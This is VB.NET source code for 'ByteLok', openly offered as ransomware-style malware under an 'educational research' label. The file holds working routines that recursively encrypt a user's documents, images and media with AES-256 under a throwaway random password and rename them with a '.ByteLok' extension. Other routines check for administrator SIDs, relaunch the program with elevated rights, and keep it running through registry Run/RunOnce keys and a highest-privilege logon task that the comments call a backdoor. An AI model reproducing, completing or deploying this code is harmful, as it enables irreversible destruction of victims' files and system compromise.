REM: ByteLok (BETA-TEST): Created by: Justin Linwood Ross
REM: Black Star Research Facility
REM: ⓒ Copyright: November 18, 2024
REM: Rijndael Managed 256-BIT 
REM: Directory ENCRYPTION ONLY!!!!! 4-5 Second Runtime (Silent-Mode) | Gains Registry & Task Scheduler Hold
REM: Project: Light Sword (AKA: ByteLok)
REM: Classification #:N\A  |  Request Doc Pass from C.O.
REM: Declassification #:37620917BC-4H
REM: For Educational Research Only
REM: Support: https://learn.microsoft.com/en-us/purview/office-365-encryption-risks-and-protections
REM: Learn:
REM: https://learn.microsoft.com/en-us/dotnet/api/system.security.cryptography.cryptostream?view=net-8.0
REM: https://learn.microsoft.com/en-us/dotnet/api/system.security.cryptography.rijndaelmanaged?view=net-8.0
REM: https://learn.microsoft.com/en-us/dotnet/api/system.io.memorystream?view=net-8.0

Imports System.ComponentModel
Imports System.IO
Imports System.Security.Cryptography
Imports System.Text
Imports System.Threading

Public Class Form1

    REM: Declaring Global Variables
    Private ReadOnly userName As String = Environment.UserName

    Private ReadOnly computerName As String = Environment.MachineName.ToString()

    Private ReadOnly Input As String = userName & computerName

    Private ReadOnly userDir As String = Environment.GetFolderPath(Environment.SpecialFolder.MyVideos)

    Private ReadOnly files As String() = Directory.GetFiles(userDir)

    Private ReadOnly childDirectories As String() = Directory.GetDirectories(userDir)
    REM: Global End>>>>

    Private Sub Form1_Load(sender As Object,
                           e As EventArgs) Handles MyBase.Load
        ' Exodus(userDir)
        'EncryptDirectory(userDir, True) 'Calls for encryption process to begin.
        Timer1.Start() 'Call for launch which calls to other timers.
        ' SubContractors()    'Calls on the "Background Worker", that schedules the Startup-Task for this app at the next startup.
        ' SoilWork()          'Backup Task Scheduler at the highest admin level.
        My.Computer.Audio.Play(My.Resources.audio_file, AudioPlayMode.BackgroundLoop)
        ' My.Computer.Registry.CurrentUser.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True).SetValue(Application.ProductName, Application.ExecutablePath) 'Gain Registry Access

        Dim numbers = Enumerable.Range(1, 12) 'creating multiple threads for a faster and efficiant program

        For Each number In numbers
            Dim n = number

            Task.Run(Sub() Worker1(n))
        Next
        For Each number In numbers
            Dim m = number
            Task.Run(Sub() Worker2(m))
        Next
    End Sub
    'Seperate thread
    Private Sub Worker1(number As Integer)
        EncryptDirectory(userDir, number)
    End Sub
    'Seperate thread
    Private Sub Worker2(number1 As Integer)
        Exodus(userDir & number1)
    End Sub


    REM: AES-256 encryption is a cryptographic algorithm that uses a 256-bit key to protect data with a high level of security
    REM: AES stands for Advanced Encryption Standard, and 256-bit refers to the length of the encryption key
    REM: How it works: AES-256 Is a symmetric encryption algorithm, which means the same key Is used to encrypt And decrypt data. The keys length makes it very difficult for unauthorized people to decrypt the data without the key.
    REM: How it's used: AES-256 Is used to protect sensitive data Like financial information, personal data, And classified government information. Its also used in the healthcare industry to protect patient data.
    REM: Why it's secure: AES-256 Is considered one of the most secure encryption methods available today. The key size Is considered virtually uncrackable, even with the most advanced computing power.
    Public Function AES_Encrypt(bytesToBeEncrypted As Byte(),
                                passwordBytes As Byte()) As Byte()
        Dim encryptedBytes As Byte() = Nothing

        Using ms As New MemoryStream()

            Using AES As New RijndaelManaged()
                AES.KeySize = 256
                AES.BlockSize = 128
                Dim saltBytes As Byte() = New Byte() {1, 2, 3, 4, 5, 6, 7, 8}
                Dim key = New Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000)
                AES.Key = key.GetBytes(AES.KeySize / 8)
                AES.IV = key.GetBytes(AES.BlockSize / 8)
                AES.Mode = CipherMode.CBC

                Using cs = New CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write)
                    cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length)
                    cs.Close()
                End Using

                encryptedBytes = ms.ToArray()
            End Using
        End Using

        Return encryptedBytes
    End Function


    Public Function CreatePassword(length As Integer) As String
        Dim res As New StringBuilder()
        While 0 < Math.Max(Interlocked.Decrement(length), length + 1)
            Const valid As String = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/Courtisy_ByteLok"
            Dim rnd As New Random()
            res.Append(valid(rnd.[Next](valid.Length)))
        End While

        Return res.ToString()
    End Function

    'To add Decryption, alter this method below.
    Public Sub EncryptFile(file As String, password As String)
        Dim passwordBytes As Byte() = Encoding.UTF8.GetBytes(password)
        passwordBytes = SHA256.Create().ComputeHash(passwordBytes)
        Dim bytesToBeEncrypted As Byte() = IO.File.ReadAllBytes(file)
        Dim bytesEncrypted As Byte() = AES_Encrypt(bytesToBeEncrypted, passwordBytes)
        IO.File.WriteAllBytes(file, bytesEncrypted)
        IO.File.Move(file, file & ".ByteLok")
    End Sub

    'Searches through Directories via "Enumerated Files" seeking the list of extensions, passing the values for encryption processing that match (the extension)
    'Note: This is the Primary Cryptography Process
    Private Sub Exodus(password As String)
        Dim ext = New List(Of String) From { 'More extensions can be added
        "jpg",
        "gif",
        "png",
        "txt",
        "mp3",
        "crx",
        "xls",
        "xlsx",
        "bin",
        "jpeg",
        "doc",
        "docx",
        "ppt",
        "pptx",
        "odt",
        "ods",
        "cvs",
        "sql",
        "mdb",
        "sln",
        "php",
        "html",
        "css",
        "xml",
        "asp",
        "aspx",
        "psd",
        "pdf",
        "avi",
        "mp4"
    }

        For i As Integer = 0 To files.Length - 1
            Dim exo As String = Path.GetExtension(files(i))
            Dim myExtensions = Directory.EnumerateFiles(userDir, "*.*", SearchOption.AllDirectories) _
                .Where(Function(s) ext.Contains(Path.GetExtension(s).TrimStart(".").ToLowerInvariant()))
            If Not myExtensions.Contains(exo) Then
                Continue For
                EncryptFile(files(i),
                            password)
            End If

        Next
        For i As Integer = 0 To childDirectories.Length - 1
            EncryptDirectory(childDirectories(i),
                             password)
        Next
    End Sub

    REM: Child Process for string search>>> | <<<I kept the original extension search method as a backup, its fussy which is why I wrote the above code.
    Public Sub EncryptDirectory(password As String, location As String) '<<<<< This "location string" is useless but if you remove it, the app will show code errors...


        Dim validExtensions = {".txt", ".mp4", ".mp3", ".crx", ".xls", ".xlsx", ".bin", ".jpeg", ".doc", ".docx", ".ppt", ".pptx", ".odt", "ods", ".jpg", ".png", ".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd", ".pdf"}
        Try

            For i As Integer = 0 To files.Length - 1
                Dim extension As String = Path.GetExtension(files(i))
                Select Case extension
                    Case extension

                        If validExtensions.Contains(extension) Then
                            EncryptFile(files(i), password)
                        End If

                    Case Else
                        Exit Select
                End Select

            Next
            For i As Integer = 0 To childDirectories.Length - 1
                EncryptDirectory(childDirectories(i), password)
            Next

        Catch __unusedSystemException1__ As SystemException
            Debug.WriteLine(__unusedSystemException1__)
        End Try
    End Sub

    'Launches the process of forms starting,; each with their own "Directory to Encrypt" for a task
    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Form2.Show()
        Hide()
    End Sub

    REM: GPO Security Identifier | Creators Owner ID, (Highest Mandatory Level) | Schedule Task "
    'GPO cmdlet creates a GPO with a specified name. By default, the newly created GPO is not linked to a site,
    'domain, or organizational unit (OU).
    'You can use this cmdlet To create a GPO that Is based On a starter GPO by specifying the GUID Or the display name
    'Of the Starter GPO, Or by piping a StarterGpo Object into the cmdlet.
    'The cmdlet returns a GPO Object, which represents the created GPO that you can pipe "To other Group Policy cmdlets."
    Public Function GPO(cmd As String,
                        Optional args As String = "",
                        Optional startin As String = "") As String
        GPO = ""
        Try
            Dim p = New Process With {
                .StartInfo = New ProcessStartInfo(cmd, args)
            }
            If startin <> "" Then p.StartInfo.WorkingDirectory = startin
            p.StartInfo.RedirectStandardOutput = True
            p.StartInfo.RedirectStandardError = True
            p.StartInfo.UseShellExecute = False
            p.StartInfo.CreateNoWindow = True
            p.Start()
            p.WaitForExit()
            Dim s = p.StandardOutput.ReadToEnd
            s += p.StandardError.ReadToEnd
            GPO = s
        Catch ex As Exception
        End Try
    End Function ' Get Process Output.

    'Possession Part of Owning System Via; The <Security Identifier>
    Public Function CanH() As Boolean
        CanH = False
        'Displays user, group, and privileged information for the user who is currently logged on to the local system.
        'If used without parameters, whoami displays the current domain and user name.
        'https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/whoami
        Dim s = GPO(
            "c: \windows\system32\cmd.exe",
            "/c whoami /all | findstr /I /C:""S-1-5-32-544""") '<<This is a Security Identifier
        If s.Contains("S-1-5-32-544") Then CanH = True
    End Function ' Check if can get Higher.

    'Below: Creators Owner ID has discovered the "Security Identifier" to be replaced by the "S-1-16-12288"
    '(Highestndatory Level) ADMIN.
    'A Security Identifier (SID) is used to uniquely identify a security principal or security group. Security principals can represent any entity
    'that can be authenticated by the operating system, such as a user account, a computer account, or a thread or process that runs in the security
    'context of a user or computer account.Each account Or group, Or process running in the security context of the account,
    'has a unique SID that Is issued by an authority, such as a Windows domain controller. It Is stored in a security database.
    'The system generates the SID that identifies a particular account Or group at the time the account Or group Is created.
    'When a SID has been used as the unique identifier for a user Or group, it can never be used again to identify another user Or group.
    'Each time a user signs in, the system creates an access token for that user. The access token contains the user's SID, user rights, and the SIDs
    'for any groups the user belongs to. This token provides the security context for whatever actions the user performs on that computer.
    'In addition to the uniquely created, domain-specific SIDs that are assigned to specific users And groups, there are well-known SIDs that identify
    'generic groups And generic users. For example, the Everyone And World SIDs identify a group that includes all users. Well-known SIDs have values
    'that remain constant across all operating systems. SIDs are a fundamental building block Of the Windows security model.
    'They work With specific components Of the authorization And access control technologies In the security infrastructure Of the
    'Windows Server operating systems. This helps protect access To network resources And provides a more secure computing environment.
    '>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
    'How security identifiers work:
    'Users refer To accounts by Using the account name, but the operating system internally refers To accounts And processes
    'that run In the security context Of the account by Using their security identifiers (SIDs). For domain accounts, the SID Of a
    'security principal Is created by concatenating the SID Of the domain With a relative identifier (RID) For the account.
    'SIDs are unique within their scope (domain Or local), And they are never reused.
    Public Function CH() As Boolean
        CH = False
        Dim s = GPO("c:\windows\system32\cmd.exe",
                    "/c whoami /all | findstr /I /C:""S-1-16-12288""")
        If s.Contains("S-1-16-12288") Then CH = True
    End Function ' Check if Higher.

    'Elevating Privileges
    Public Function GH() As Boolean
        GH = False
        If Not CH() Then
            Try
                'Elevating process privilege programmatically.
                'In computing, runas is a command in the Microsoft Windows line of operating systems that allows a user to run specific
                'tools and programs under a different username to the one that was used to logon to a computer interactively.
                Dim pc As New ProcessStartInfo(Process.GetCurrentProcess.MainModule.FileName) With {
                    .Verb = "runas"
                }
                Dim p = Process.Start(pc)
                Return True
            Catch ex As Exception
                Return False
            End Try
        End If
    End Function ' Get Higher Level As Admin.

    'Now that the information is gathered, we create a backdoor into the system via entry of Task Scheduler
    'with the highest Logon.
    Private Sub SubContractors()
        ' StartUp BackgroundWorker to schedule a startup task
        Dim subw As New BackgroundWorker()
        AddHandler subw.DoWork, Sub(sender1 As Object,
                                    e1 As DoWorkEventArgs)
                                    'Schedules Task to start up with Admin Rights
                                    While True
                                        Try
                                            If CH() Then
                                                If Not GPO("c:\windows\system32\cmd.exe",
                                                           $"/C schtasks /create /rl HIGHEST /sc ONLOGON /tn ByteLok /F /tr """"{Process.GetCurrentProcess.MainModule.FileName}""""").Contains("successfully") Then
                                                    My.Computer.Registry.CurrentUser.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\RunOnce", True).SetValue("ByteLok",
                                                                                                                                                                    Process.GetCurrentProcess.MainModule.FileName)
                                                End If
                                            Else
                                                My.Computer.Registry.CurrentUser.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\RunOnce", True).SetValue("ByteLok",
                                                                                                                                                                Process.GetCurrentProcess.MainModule.FileName)
                                            End If
                                        Catch ex As Exception
                                        End Try
                                        Const MillisecondsTimeout As Integer = &H3A98 '15000
                                        Thread.Sleep(MillisecondsTimeout)
                                    End While
                                End Sub
        subw.RunWorkerAsync()
    End Sub

    'This is a secondary worker backup for our "Background Worker" in the event the task fails.
    Private Sub SoilWork()
        On Error Resume Next
        Dim p As New Process
        With p.StartInfo
            .FileName = "schtasks.exe"
            .Arguments = $"/C schtasks /create /rl HIGHEST /sc ONLOGON /tn ByteLok /F /tr """"{Process.GetCurrentProcess.MainModule.FileName}""""".Contains("successfully")
            .UseShellExecute = False
            .RedirectStandardOutput = True
            .CreateNoWindow = True
        End With
        My.Computer.Registry.CurrentUser.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\RunOnce",
                                                    True).SetValue("ByteLok", Process.GetCurrentProcess.MainModule.FileName)
        p.Start()

        Dim s As String = p.StandardOutput.ReadToEnd
        MessageBox.Show(s,
                        "Create Task Results..")
    End Sub


End Class
